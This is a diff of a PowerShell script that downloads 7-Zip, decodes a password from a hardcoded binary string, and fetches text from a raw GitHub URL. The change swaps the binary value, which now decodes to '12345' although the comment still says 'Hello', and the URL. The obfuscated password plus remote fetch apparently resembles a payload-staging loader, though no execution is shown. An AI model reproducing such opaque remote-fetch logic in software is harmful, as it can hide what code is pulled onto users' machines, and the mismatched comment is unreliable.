@@ -56,13 +56,13 @@ Function DownloadAndExtract7Zip {
 
 # Function to decrypt hardcoded binary string to get password
 Function Get-DecryptedPassword {
-    $hardcodedBinary = "0100100001100101011011000110110001101111" # Example binary for "Hello"
+    $hardcodedBinary = "0011000100110010001100110011010000110101" # Example binary for "Hello"
     $password = Convert-BinaryToText -binaryInput $hardcodedBinary
     return $password
 }
 
 # URL of the hosted text file
-$url = "https://raw.githubusercontent.com/asd/4ds/main/3.txt" # Replace this with the actual URL
+$url = "https://raw.githubusercontent.com/asd/4ds/main/8.txt" # Replace this with the actual URL
 
 # Fetch the content from the URL
 $rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop
